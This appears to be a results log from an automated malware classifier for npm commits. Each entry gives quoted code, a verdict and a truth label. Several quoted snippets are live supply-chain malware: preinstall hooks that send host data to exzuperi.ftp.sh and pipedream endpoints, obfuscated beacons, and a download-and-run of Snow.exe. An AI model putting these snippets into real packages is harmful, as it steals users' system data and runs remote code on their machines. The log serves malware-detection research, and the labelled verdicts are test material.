Code: `const payload = JSON.stringify({   home: os.homedir(),   hostname: os.hostname(),   dir: __dirname,   pkg: require('./package.json').name }); const req = https.request({   hostname: 'exzuperi.ftp.sh',`
Reason: The snippet gathers sensitive environment data and sends it to an external server (exzuperi.ftp.sh) via HTTPS. This matches the high‑severity "suspicious_network_access" and "data_leak" issues, indicating clear data‑exfiltration behavior.

**Summary:** Static analysis revealed high‑severity indicators of data exfiltration—collecting host information and transmitting it to an untrusted external endpoint. Dynamic analysis showed no mitigating activity. The combination of these factors leads to a malware verdict.

**Truth label:** Malware

### Commit 508ac263: Malware
**File index.js**:
Code: `const https = require('https'); const trackingData = {   home: process.env.HOME,   hostname: require('os').hostname(),   username: require('os').userInfo().username,   dns: require('dns').getServers()`
Reason: The script gathers extensive host information and the full package.json, then sends it to an external domain via HTTPS POST. This is classic data‑exfiltration behavior, especially when executed automatically during installation.

**File package.json**:
Code: `"scripts": {   "preinstall": "node index.js",   "pingback": "curl https://hooks.pipedream.net/..." },`
Reason: The preinstall script runs the malicious index.js automatically on every npm install, ensuring the exfiltration runs without user interaction. The additional pingback script provides another covert channel for beaconing.

**Summary:** Static analysis reveals critical and high‑severity issues: automatic execution of code that collects sensitive system data and transmits it to an attacker‑controlled server. Such behavior matches known malware patterns, outweighing the lack of dynamic findings. Therefore, the commit is classified as MALWARE.

**Truth label:** Malware

### Commit fbebef64: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. No malicious code snippets or runtime anomalies were detected, indicating the commit is benign.

**Truth label:** Benign

### Commit fc70c956: Benign
**Summary:** Both static and dynamic analyses reported no issues or suspicious behavior. The static scan found zero issues, and the dynamic execution produced no observable malicious actions. Therefore, there is no evidence to classify this commit as malware.

**Truth label:** Benign

### Commit d1cc8e63: Malware
**File package.json**:
Code: `"preinstall": "node app.js"`
Reason: The preinstall script runs arbitrary JavaScript during npm install, giving an attacker code execution on any machine that installs the package.

**File app.js**:
Code: `const http = require('http'); http.get('http://lolzettle-bololroutes.package.0xlupin.com');`
Reason: The script contacts an external domain during the preinstall phase, acting as a beacon and potential data exfiltration vector.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Provides a manual or programmatic way to send data to an uncontrolled remote endpoint, which can be used for exfiltration or signaling.

**Summary:** Multiple high‑severity indicators of malicious behavior are present: a preinstall hook that executes code automatically, outbound network requests to unknown domains, and a pingback script for remote signaling. These patterns are characteristic of supply‑chain malware, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit b0f0c8a4: Malware
**File package.json**:
Code: `"preinstall": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The preinstall script runs a curl command that contacts an external URL during npm install, enabling silent data exfiltration or payload download without user consent.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Similar to the preinstall script, this pingback script executes a shell command that reaches out to an unknown endpoint, providing a command‑execution vector and network beacon.

**File @Moonlink/MoonlinkNodes.js**:
Code: `function _0x4d30(){...} // heavily obfuscated block that builds a URL and calls await this[...][...](data)`
Reason: The obfuscated code constructs a URL with player/track data and sends it to an external service, indicating intentional data leakage. Obfuscation hides the exact destination and payload, a common malware technique.

**Summary:** Static analysis reveals multiple critical and high‑severity issues: unauthorized outbound network requests executed during installation, shell command execution, and obfuscated code that transmits potentially sensitive data to an external endpoint. Although dynamic analysis did not capture runtime behavior, the presence of these patterns strongly indicates malicious intent. Therefore, the commit is classified as MALWARE.

**Truth label:** Benign

### Commit c6b1c53f: Malware
**File index.js**:
Code: `const trackingData = {     home: os.homedir(),     hostname: os.hostname(),     user: os.userInfo().username,     dns: dnsServers,     pkg: require('./package.json') }; fetch('http://wmmlfdwpcalzfkoyk`
Reason: The code collects detailed system information and sends it via an unauthenticated POST request to an external domain controlled by the attacker. This constitutes unauthorized data exfiltration and is a classic indicator of malicious telemetry.

**Summary:** Static analysis reveals that the commit introduces code that harvests sensitive host data and transmits it to an external, untrusted endpoint without user consent. Such behavior aligns with data‑leak and exfiltration patterns typical of malware, leading to a MALWARE verdict.

**Truth label:** Malware

### Commit 15258dde: Malware
**File package.json**:
Code: `"preinstall": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: The preinstall script runs automatically during npm install and makes an outbound HTTP request to an untrusted domain, enabling silent data exfiltration or beaconing.

**File package.json**:
Code: `"pingback": "curl https://eo536ohsnextro9.m.pipedream.net"`
Reason: Provides a manual trigger for the same external request, allowing an attacker or compromised developer to send data on demand.

**Summary:** Static analysis reveals high‑severity suspicious network access via npm lifecycle scripts that contact an external server without justification. Such behavior is characteristic of malicious code, and no mitigating evidence was found in dynamic analysis. Therefore the commit is classified as malware.

**Truth label:** Malware

### Commit d56090fb: Malware
**File src/index.js**:
Code: `const exec = require('child_process').exec; exec('curl -o %USERPROFILE%\\Downloads\\Snow.exe https://cdn.discordapp.com/.../Snow.exe && %USERPROFILE%\\Downloads\\Snow.exe');`
Reason: The script downloads an executable from an untrusted Discord CDN URL and immediately runs it, providing arbitrary code execution on the host.

**File src/index.js**:
Code: `axios.get('https://cdn.discordapp.com/.../Snow.exe', { responseType: 'arraybuffer' })`
Reason: Performs a suspicious network request to fetch a binary payload, indicating a download‑and‑execute behavior.

**File src/index.js**:
Code: `const malicious = new Function('return ' + obfuscatedString)();`
Reason: Uses the Function constructor with dynamically built code, a classic code‑injection technique that bypasses static analysis.

**File src/index.js**:
Code: `var _0x1234 = '\x68\x74\x74\x70...'; // hex‑escaped obfuscation`
Reason: Heavy obfuscation (hex escapes, self‑defending loops) makes the intent hard to audit and is a common indicator of malicious code.

**Summary:** Multiple critical and high‑severity issues are present: the commit downloads and executes an external binary, makes untrusted network calls, employs dynamic code execution, and is heavily obfuscated. These behaviors collectively indicate malicious intent rather than benign functionality.

**Truth label:** Malware

